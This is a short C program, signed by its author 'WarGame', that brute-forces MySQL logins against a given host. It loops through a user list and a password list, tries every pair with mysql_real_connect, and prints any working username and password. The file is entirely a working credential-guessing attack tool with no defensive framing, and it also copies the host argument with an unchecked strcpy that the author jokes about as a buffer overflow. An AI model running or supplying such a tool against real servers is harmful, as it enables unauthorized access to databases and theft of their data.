/* My little mysql bruter :) by WarGame */
/* you can contact me at: wargame89@yahoo.it */

#include <stdio.h>
#include <stdlib.h>
#include <mysql/mysql.h>

/* This function will connect to the mysql server */
int MySqlConnect(char *host,char *user,char *pass)
{
	MYSQL mysql;
	int ret_code = 0;

	if(!mysql_init(&mysql))
	{
		printf("I could not initialize MySQL lib !\n");
		exit(EXIT_FAILURE);
	}
	
	
	if(mysql_real_connect(&mysql,host,user,pass,"",0,NULL,0))
	{
		ret_code = 1;
	}

	else 
	{
		ret_code = 0;
	}

	mysql_close(&mysql);

	/* return */

	return ret_code;
}

/* my lame version of chomp() :) */
void my_chomp(char *str)
{
	int str_cnt;

	for(str_cnt = 0;str_cnt < strlen(str);str_cnt++)
	{
		if(str[str_cnt] == '\n' || str[str_cnt] == '\r')
		{
			str[str_cnt] = '\0';
		}
	}
}

int main(int argc,char *argv[])
{
	FILE *user_fd = NULL,*pass_fd = NULL;
	char current_user[256],current_pass[256],host_to_crack[256];
	
	if(!argv[1] || !argv[2] || !argv[3])
	{
		printf("Usage: %s [host] [userlist] [passlist]\n",argv[0]);
		printf("by WarGame\n");
		exit(EXIT_FAILURE);
	}

	/* BoF maniac :) */
	strcpy(host_to_crack,argv[1]);

	if(!(user_fd = fopen(argv[2],"r")))
	{
		printf("I could not open userlist !\n");
		exit(EXIT_FAILURE);
	}

	if(!(pass_fd = fopen(argv[3],"r")))
	{
		printf("I could not open passlist !\n");
		exit(EXIT_FAILURE);
	}

	printf("Starting cracking on ... [ %s ]\n",host_to_crack);
	
	/* let's start :) */
        while(!feof(user_fd))
	{
		memset(current_user,0,256);
		fgets(current_user,256,user_fd);
		my_chomp(current_user);
	
		while(!feof(pass_fd))
		{
			memset(current_pass,0,256);
			fgets(current_pass,256,pass_fd);
			my_chomp(current_pass);

			printf("Trying -> [%s / %s]\n",
					current_user,current_pass);

			if(MySqlConnect(host_to_crack,current_user,
						current_pass))
			{
				printf("---> GOT! <---\n");
				printf("USERNAME -> [ %s ]\n",current_user);
				printf("PASSWORD -> [ %s ]\n",current_pass);
				printf("------><------\n");
				exit(EXIT_SUCCESS);
			}
		}
		
		fseek(pass_fd,0,SEEK_SET);
	}

	fclose(user_fd);
	fclose(pass_fd);
	printf("Nothing :(\n");
}
